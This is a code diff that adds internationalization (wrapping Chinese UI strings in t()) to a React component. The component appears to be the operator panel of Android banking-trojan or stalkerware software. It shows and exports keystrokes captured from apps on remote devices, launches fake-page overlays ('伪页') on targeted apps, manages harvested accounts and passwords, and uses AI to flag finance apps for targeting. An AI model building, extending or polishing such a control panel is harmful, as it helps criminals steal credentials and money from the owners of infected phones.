@@ -19,6 +19,8 @@ import { formatDateTime, formatEpochMs } from "../utils/format";
 import { DeviceAppCredentialPanel } from "./DeviceAppCredentialPanel";
 import { DeviceFakePageModal } from "./DeviceFakePageModal";
 import "../styles/device-app-list-modal.css";
+import { useI18n, t } from "../i18n";
+
 
 const KEYBOARD_POLL_MS = 15_000;
 const APP_REFRESH_POLL_MS = 1500;
@@ -127,7 +129,7 @@ async function fetchAppIconsFromDevice(deviceId: string, packages: string[]) {
 function displayAppName(app: Pick<AppListItem, "label" | "packageName">) {
   const label = app.label.trim();
   if (app.packageName === UNKNOWN_APP_KEY) {
-    return label && label !== UNKNOWN_APP_KEY ? label : "未知应用";
+    return label && label !== UNKNOWN_APP_KEY ? label : t("未知应用");
   }
   if (label && label !== app.packageName) {
     return label;
@@ -140,7 +142,7 @@ function packageKey(appPackage: string | null) {
 }
 
 function displayPackageName(packageName: string) {
-  return packageName === UNKNOWN_APP_KEY ? "未知应用" : packageName;
+  return packageName === UNKNOWN_APP_KEY ? t("未知应用") : packageName;
 }
 
 function escapeCsvCell(value: string) {
@@ -173,6 +175,7 @@ export function DeviceAppListModal({
   onClose,
   embedded = false,
 }: DeviceAppListModalProps) {
+  const { locale } = useI18n();
   const [loadingApps, setLoadingApps] = useState(false);
   const [syncingApps, setSyncingApps] = useState(false);
   const [loadingKeyboard, setLoadingKeyboard] = useState(false);
@@ -398,7 +401,7 @@ export function DeviceAppListModal({
       return;
     }
     if (!isOnline) {
-      message.warning("设备离线，无法从设备刷新应用");
+      message.warning(t("设备离线，无法从设备刷新应用"));
       return;
     }
 
@@ -419,7 +422,7 @@ export function DeviceAppListModal({
       if (!stillCurrent()) {
         return;
       }
-      message.info("已下发，正在异步刷新应用列表");
+      message.info(t("已下发，正在异步刷新应用列表"));
 
       const deadline = Date.now() + APP_REFRESH_TIMEOUT_MS;
       let latest = accepted;
@@ -443,7 +446,7 @@ export function DeviceAppListModal({
       if (latest.status !== "success" || !latest.result) {
         throw new Error(
           latest.errorMessage ??
-            (latest.status === "sent" ? "刷新超时，请稍后重试" : "get_installed_apps_failed"),
+            (latest.status === "sent" ? t("刷新超时，请稍后重试") : "get_installed_apps_failed"),
         );
       }
 
@@ -461,7 +464,7 @@ export function DeviceAppListModal({
       if (!stillCurrent()) {
         return;
       }
-      message.success(`已同步 ${installedApps.length} 个应用到数据库`);
+      message.success(t("已同步 {0} 个应用到数据库", { 0: installedApps.length }));
       await loadAppsFromDb();
     } catch (error: unknown) {
       if (!stillCurrent()) {
@@ -475,7 +478,7 @@ export function DeviceAppListModal({
         setSyncingApps(false);
       }
     }
-  }, [deviceId, isOnline, loadAppsFromDb]);
+  }, [locale, deviceId, isOnline, loadAppsFromDb]);
 
   const loadKeyboardLogs = useCallback(
     async (packageName: string | null, page: number, pageSize: number) => {
@@ -645,18 +648,18 @@ export function DeviceAppListModal({
       } while (all.length < total);
 
       const appName = selectedApp ? displayAppName(selectedApp) : displayPackageName(selectedPackage);
-      downloadCsv(`${safeFilename(appName)}-键盘记录.csv`, [
-        ["序号", "输入内容", "采集时间"],
+      downloadCsv(t("{0}-键盘记录.csv", { 0: safeFilename(appName) }), [
+        [t("序号"), t("输入内容"), t("采集时间")],
         ...all.map((item, index) => [
           String(index + 1),
           item.text ?? "",
           formatDateTime(item.capturedAt),
         ]),
       ]);
-      message.success(`已导出 ${all.length} 条键盘记录`);
+      message.success(t("已导出 {0} 条键盘记录", { 0: all.length }));
     } catch (error: unknown) {
       const text = error instanceof Error ? error.message : "export_failed";
-      message.error(`导出失败：${text}`);
+      message.error(t("导出失败：{0}", { 0: text }));
     } finally {
       setExportingKeyboard(false);
     }
@@ -664,11 +667,11 @@ export function DeviceAppListModal({
 
   async function handleOpenApp(app: AppListItem) {
     if (!deviceId || !isOnline) {
-      message.warning("设备离线，无法打开应用");
+      message.warning(t("设备离线，无法打开应用"));
       return;
     }
     if (app.packageName === UNKNOWN_APP_KEY) {
-      message.warning("未知应用无法打开");
+      message.warning(t("未知应用无法打开"));
       return;
     }
     setOpeningPackage(app.packageName);
@@ -682,9 +685,9 @@ export function DeviceAppListModal({
       if (command.status !== "success") {
         throw new Error(command.errorMessage ?? command.status);
       }
-      message.success(`已打开 ${displayAppName(app)}`);
+      message.success(t("已打开 {0}", { 0: displayAppName(app) }));
     } catch (error) {
-      message.error(error instanceof Error ? error.message : "打开失败");
+      message.error(error instanceof Error ? error.message : t("打开失败"));
     } finally {
       setOpeningPackage(null);
     }
@@ -704,7 +707,7 @@ export function DeviceAppListModal({
           next.delete(app.packageName);
           return next;
         });
-        message.success("已取消金融标记");
+        message.success(t("已取消金融标记"));
       } else {
         await markFinanceApp(app.packageName, displayAppName(app));
         setFinancePackages((current) => {
@@ -712,10 +715,10 @@ export function DeviceAppListModal({
           next.add(app.packageName);
           return next;
         });
-        message.success("已标记为金融应用");
+        message.success(t("已标记为金融应用"));
       }
     } catch (error) {
-      message.error(error instanceof Error ? error.message : "标记失败");
+      message.error(error instanceof Error ? error.message : t("标记失败"));
     } finally {
       setMarkingPackage(null);
     }
@@ -729,7 +732,7 @@ export function DeviceAppListModal({
         !app.isSystem,
     );
     if (targets.length === 0) {
-      message.info("默认应用中没有可分析的非系统应用");
+      message.info(t("默认应用中没有可分析的非系统应用"));
       return;
     }
 
@@ -743,7 +746,7 @@ export function DeviceAppListModal({
       );
       const next = result.candidates ?? [];
       if (next.length === 0) {
-        message.info("未识别到金融应用");
+        message.info(t("未识别到金融应用"));
         return;
       }
       setCandidates(next);
@@ -754,11 +757,11 @@ export function DeviceAppListModal({
     } catch (error) {
       const text = error instanceof Error ? error.message : "ai_analyze_failed";
       if (text === "ai_disabled") {
-        message.error("AI 未启用：请到左侧「AI 配置」打开「启用 AI」并保存");
+        message.error(t("AI 未启用：请到左侧「AI 配置」打开「启用 AI」并保存"));
       } else if (text === "ai_api_key_missing") {
-        message.error("请先在左侧菜单「AI 配置」中填写 API Key 并保存");
+        message.error(t("请先在左侧菜单「AI 配置」中填写 API Key 并保存"));
       } else if (text.startsWith("apiyi_request_failed:")) {
-        message.error(`APIYI 调用失败：${text.replace("apiyi_request_failed:", "").trim()}`);
+        message.error(t("APIYI 调用失败：{0}", { 0: text.replace("apiyi_request_failed:", "").trim() }));
       } else {
         message.error(text);
       }
@@ -772,7 +775,7 @@ export function DeviceAppListModal({
       selectedPackages.includes(item.packageName),
     );
     if (selected.length === 0) {
-      message.warning("请至少勾选一个应用");
+      message.warning(t("请至少勾选一个应用"));
       return;
     }
     setApplyingMarks(true);
@@ -790,13 +793,13 @@ export function DeviceAppListModal({
         }
         return next;
       });
-      message.success(`已标记 ${selected.length} 个金融应用`);
+      message.success(t("已标记 {0} 个金融应用", { 0: selected.length }));
       setConfirmOpen(false);
       setCandidates([]);
       setSelectedPackages([]);
       setCategoryTab("finance");
     } catch (error) {
-      message.error(error instanceof Error ? error.message : "批量标记失败");
+      message.error(error instanceof Error ? error.message : t("批量标记失败"));
     } finally {
       setApplyingMarks(false);
     }
@@ -806,8 +809,7 @@ export function DeviceAppListModal({
       <>
       <div className="device-app-list-toolbar">
         <p className="device-app-list-hint">
-          默认从数据库读取已同步的安装列表；点「异步刷新」会先下发指令，设备回报后再入库。金融标记为全局。
-          「AI 金融分析」只扫默认应用中的非系统未标记项，确认后写入全局金融库。
+          {t("默认从数据库读取已同步的安装列表；点「异步刷新」会先下发指令，设备回报后再入库。金融标记为全局。\n          「AI 金融分析」只扫默认应用中的非系统未标记项，确认后写入全局金融库。")}
         </p>
         <div className="device-app-list-toolbar-actions">
           <Button
@@ -815,21 +817,21 @@ export function DeviceAppListModal({
             disabled={!deviceId || analyzingFinance || apps.length === 0}
             onClick={() => void handleAiAnalyzeFinance()}
           >
-            AI 金融分析
+            {t("AI 金融分析")}
           </Button>
           <Button
             loading={syncingApps || loadingApps}
             disabled={!deviceId || !isOnline}
             onClick={() => void refreshAppsFromDevice()}
           >
-            异步刷新
+            {t("异步刷新")}
           </Button>
         </div>
       </div>
 
       {!isOnline ? (
         <div className="device-app-list-offline">
-          设备离线：仅展示数据库中已同步的安装应用与键盘历史；上线后点「异步刷新」可更新安装列表入库。
+          {t("设备离线：仅展示数据库中已同步的安装应用与键盘历史；上线后点「异步刷新」可更新安装列表入库。")}
         </div>
       ) : null}
 
@@ -838,7 +840,7 @@ export function DeviceAppListModal({
       <div className="device-app-list-layout">
         <section className="device-app-list-pane">
           <div className="device-app-list-pane-head">
-            <div className="device-app-list-tabs" role="tablist" aria-label="应用分类">
+            <div className="device-app-list-tabs" role="tablist" aria-label={t("应用分类")}>
               <button
                 type="button"
                 role="tab"
@@ -846,7 +848,7 @@ export function DeviceAppListModal({
                 className={`device-app-list-tab ${categoryTab === "default" ? "is-active" : ""}`}
                 onClick={() => setCategoryTab("default")}
               >
-                默认应用 ({tabCounts.defaultCount})
+                {t("默认应用 (")}{tabCounts.defaultCount})
               </button>
               <button
                 type="button"
@@ -855,12 +857,12 @@ export function DeviceAppListModal({
                 className={`device-app-list-tab ${categoryTab === "finance" ? "is-active" : ""}`}
                 onClick={() => setCategoryTab("finance")}
               >
-                金融应用 ({tabCounts.financeCount})
+                {t("金融应用 (")}{tabCounts.financeCount})
               </button>
             </div>
             <Input
               allowClear
-              placeholder="搜索应用名 / 包名"
+              placeholder={t("搜索应用名 / 包名")}
               value={searchText}
               onChange={(event) => setSearchText(event.target.value)}
             />
@@ -870,17 +872,17 @@ export function DeviceAppListModal({
                 checked={showSystemApps}
                 onChange={(event) => setShowSystemApps(event.target.checked)}
               />
-              显示系统应用
+              {t("显示系统应用")}
             </label>
           </div>
 
           {loadingApps && apps.length === 0 ? (
-            <div className="device-app-list-empty">加载应用中…</div>
+            <div className="device-app-list-empty">{t("加载应用中…")}</div>
           ) : filteredApps.length === 0 ? (
             <div className="device-app-list-empty">
               {categoryTab === "finance"
-                ? "暂无金融应用（可先在默认应用中标记）"
-                : "暂无应用数据，请在线后点「异步刷新」入库"}
+                ? t("暂无金融应用（可先在默认应用中标记）")
+                : t("暂无应用数据，请在线后点「异步刷新」入库")}
             </div>
           ) : (
             <div className="device-app-list-scroll">
@@ -927,12 +929,12 @@ export function DeviceAppListModal({
                           <span className="device-app-list-item-name">{displayAppName(app)}</span>
                           {isFinance ? (
                             <span className="device-app-list-badge device-app-list-badge--finance">
-                              金融
+                              {t("金融")}
                             </span>
                           ) : null}
                           {fakePageHookPackages.has(app.packageName) ? (
                             <span className="device-app-list-badge device-app-list-badge--fake-page">
-                              伪页
+                              {t("伪页")}
                             </span>
                           ) : null}
                           {app.hasKeyboardLogs ? (
@@ -941,13 +943,13 @@ export function DeviceAppListModal({
                         </div>
                         <div className="device-app-list-item-meta">
                           <span className="device-app-list-item-package">
-                            包名：{displayPackageName(app.packageName)}
+                            {t("包名：")}{displayPackageName(app.packageName)}
                           </span>
-                          {app.isSystem ? <span> · 系统</span> : null}
-                          {!app.fromDevice ? <span> · 仅历史记录</span> : null}
+                          {app.isSystem ? <span> {t("· 系统")}</span> : null}
+                          {!app.fromDevice ? <span> {t("· 仅历史记录")}</span> : null}
                         </div>
                         <div className="device-app-list-item-meta">
-                          最后使用：{formatEpochMs(app.lastUsedTime)}
+                          {t("最后使用：")}{formatEpochMs(app.lastUsedTime)}
                         </div>
                       </div>
                     </div>
@@ -963,7 +965,7 @@ export function DeviceAppListModal({
                               void handleOpenApp(app);
                             }}
                           >
-                            打开
+                            {t("打开")}
                           </Button>
                         ) : null}
                         {canFakePage ? (
@@ -976,7 +978,7 @@ export function DeviceAppListModal({
                               setFakePageTarget(app);
                             }}
                           >
-                            伪页
+                            {t("伪页")}
                           </Button>
                         ) : null}
                         {canMarkFinance ? (
@@ -990,7 +992,7 @@ export function DeviceAppListModal({
                               void handleToggleFinance(app);
                             }}
                           >
-                            {isFinance ? "取消金融" : "标为金融"}
+                            {isFinance ? t("取消金融") : t("标为金融")}
                           </Button>
                         ) : null}
                       </div>
@@ -1006,19 +1008,19 @@ export function DeviceAppListModal({
           <div className="device-app-list-pane-head">
             <strong>
               {selectedApp
-                ? `${displayAppName(selectedApp)} 详情`
-                : "应用详情"}
+                ? t("{0} 详情", { 0: displayAppName(selectedApp) })
+                : t("应用详情")}
             </strong>
             {selectedApp ? (
               <div className="device-app-list-pane-meta">
-                <span>应用名：{displayAppName(selectedApp)}</span>
-                <span>包名：{displayPackageName(selectedApp.packageName)}</span>
+                <span>{t("应用名：")}{displayAppName(selectedApp)}</span>
+                <span>{t("包名：")}{displayPackageName(selectedApp.packageName)}</span>
               </div>
             ) : (
-              <span className="device-app-list-pane-sub">请选择应用</span>
+              <span className="device-app-list-pane-sub">{t("请选择应用")}</span>
             )}
             {selectedPackage ? (
-              <div className="device-app-list-detail-tabs" role="tablist" aria-label="详情分类">
+              <div className="device-app-list-detail-tabs" role="tablist" aria-label={t("详情分类")}>
                 <button
                   type="button"
                   role="tab"
@@ -1026,7 +1028,7 @@ export function DeviceAppListModal({
                   className={`device-app-list-tab ${detailTab === "keyboard" ? "is-active" : ""}`}
                   onClick={() => setDetailTab("keyboard")}
                 >
-                  键盘记录
+                  {t("键盘记录")}
                 </button>
                 <button
                   type="button"
@@ -1035,7 +1037,7 @@ export function DeviceAppListModal({
                   className={`device-app-list-tab ${detailTab === "accounts" ? "is-active" : ""}`}
                   onClick={() => setDetailTab("accounts")}
                 >
-                  账号管理
+                  {t("账号管理")}
                 </button>
                 <button
                   type="button"
@@ -1044,14 +1046,14 @@ export function DeviceAppListModal({
                   className={`device-app-list-tab ${detailTab === "passwords" ? "is-active" : ""}`}
                   onClick={() => setDetailTab("passwords")}
                 >
-                  密码管理
+                  {t("密码管理")}
                 </button>
               </div>
             ) : null}
           </div>
 
           {!selectedPackage || !deviceId ? (
-            <div className="device-app-list-empty">请从左侧选择一个应用</div>
+            <div className="device-app-list-empty">{t("请从左侧选择一个应用")}</div>
           ) : (
             <DeviceAppCredentialPanel
               deviceId={deviceId}
@@ -1061,11 +1063,11 @@ export function DeviceAppListModal({
               keyboardContent={
                 ((): ReactNode => {
                   if (loadingKeyboard && keyboardLogs.length === 0) {
-                    return <div className="device-app-list-empty">加载键盘记录中…</div>;
+                    return <div className="device-app-list-empty">{t("加载键盘记录中…")}</div>;
                   }
                   if (keyboardLogs.length === 0) {
                     return (
-                      <div className="device-app-list-empty">该应用暂无键盘输入记录</div>
+                      <div className="device-app-list-empty">{t("该应用暂无键盘输入记录")}</div>
                     );
                   }
                   return (
@@ -1077,16 +1079,16 @@ export function DeviceAppListModal({
                           disabled={exportingKeyboard || keyboardTotal === 0}
                           onClick={() => void exportKeyboardLogs()}
                         >
-                          {exportingKeyboard ? "导出中…" : "导出表格"}
+                          {exportingKeyboard ? t("导出中…") : t("导出表格")}
                         </button>
                       </div>
                       <div className="device-app-list-keyboard-wrap">
                         <table className="device-app-list-keyboard-table">
                           <thead>
                             <tr>
-                              <th>序号</th>
-                              <th>输入内容</th>
-                              <th>采集时间</th>
+                              <th>{t("序号")}</th>
+                              <th>{t("输入内容")}</th>
+                              <th>{t("采集时间")}</th>
                             </tr>
                           </thead>
                           <tbody>
@@ -1101,9 +1103,9 @@ export function DeviceAppListModal({
                         </table>
                       </div>
                       <footer className="device-app-list-keyboard-pagination">
-                        <span>共 {keyboardTotal} 条</span>
+                        <span>{t("共")} {keyboardTotal} {t("条")}</span>
                         <label>
-                          每页
+                          {t("每页")}
                           <select
                             value={keyboardPageSize}
                             disabled={loadingKeyboard}
@@ -1114,7 +1116,7 @@ export function DeviceAppListModal({
                           >
                             {KEYBOARD_PAGE_SIZE_OPTIONS.map((size) => (
                               <option key={size} value={size}>
-                                {size} 条/页
+                                {size} {t("条/页")}
                               </option>
                             ))}
                           </select>
@@ -1128,7 +1130,7 @@ export function DeviceAppListModal({
                               setKeyboardPage((current) => Math.max(1, current - 1))
                             }
                           >
-                            上一页
+                            {t("上一页")}
                           </button>
                           <span>
                             {keyboardPage} / {keyboardTotalPages}
@@ -1143,7 +1145,7 @@ export function DeviceAppListModal({
                               )
                             }
                           >
-                            下一页
+                            {t("下一页")}
                           </button>
                         </div>
                       </footer>
@@ -1166,7 +1168,7 @@ export function DeviceAppListModal({
       />
 
       <Modal
-        title="AI 识别结果 — 确认标记为金融"
+        title={t("AI 识别结果 — 确认标记为金融")}
         open={confirmOpen}
         onCancel={() => {
           if (applyingMarks) {
@@ -1189,7 +1191,7 @@ export function DeviceAppListModal({
               )
             }
           >
-            全选高置信
+            {t("全选高置信")}
           </Button>,
           <Button
             key="all"
@@ -1198,14 +1200,14 @@ export function DeviceAppListModal({
               setSelectedPackages(candidates.map((item) => item.packageName))
             }
           >
-            全选
+            {t("全选")}
           </Button>,
           <Button
             key="cancel"
             disabled={applyingMarks}
             onClick={() => setConfirmOpen(false)}
           >
-            取消
+            {t("取消")}
           </Button>,
           <Button
             key="ok"
@@ -1213,12 +1215,12 @@ export function DeviceAppListModal({
             loading={applyingMarks}
             onClick={() => void handleConfirmAiMarks()}
           >
-            确认标记为金融 ({selectedPackages.length})
+            {t("确认标记为金融 (")}{selectedPackages.length})
           </Button>,
         ]}
       >
         <p className="device-app-list-hint">
-          仅分析默认应用中的非系统、未标记项。置信度 ≥ 0.8 默认勾选；确认后写入全局金融标记。
+          {t("仅分析默认应用中的非系统、未标记项。置信度 ≥ 0.8 默认勾选；确认后写入全局金融标记。")}
         </p>
         <Table
           size="small"
@@ -1265,23 +1267,23 @@ export function DeviceAppListModal({
               ),
             },
             {
-              title: "应用",
+              title: t("应用"),
               dataIndex: "label",
               ellipsis: true,
             },
             {
-              title: "包名",
+              title: t("包名"),
               dataIndex: "packageName",
               ellipsis: true,
             },
             {
-              title: "置信度",
+              title: t("置信度"),
               dataIndex: "confidence",
               width: 88,
               render: (value: number) => value.toFixed(2),
             },
             {
-              title: "原因",
+              title: t("原因"),
               dataIndex: "reason",
               ellipsis: true,
             },
@@ -1298,9 +1300,9 @@ export function DeviceAppListModal({
     return (
       <div className="device-app-list-embedded">
         <div className="device-app-list-embedded-head">
-          <span>{deviceLabel ? `应用列表 - ${deviceLabel}` : "应用列表"}</span>
+          <span>{deviceLabel ? t("应用列表 - {0}", { 0: deviceLabel }) : t("应用列表")}</span>
           <Button type="link" onClick={onClose}>
-            关闭
+            {t("关闭")}
           </Button>
         </div>
         {listBody}
@@ -1310,7 +1312,7 @@ export function DeviceAppListModal({
 
   return (
     <Modal
-      title={deviceLabel ? `应用列表 - ${deviceLabel}` : "应用列表"}
+      title={deviceLabel ? t("应用列表 - {0}", { 0: deviceLabel }) : t("应用列表")}
       open={open}
       onCancel={onClose}
       footer={null}
